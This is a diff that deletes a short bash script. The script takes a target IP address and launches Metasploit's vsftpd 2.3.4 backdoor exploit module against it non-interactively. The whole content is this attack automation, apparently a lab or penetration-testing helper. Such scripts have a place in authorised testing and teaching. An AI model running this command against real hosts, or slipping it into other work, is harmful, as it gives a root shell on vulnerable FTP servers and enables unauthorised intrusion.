@@ -1,6 +1,0 @@
-#!/bin/bash
-
-# takes one argument the target ip address"
-TARGET=$1
-
-msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST $TARGET; run;"
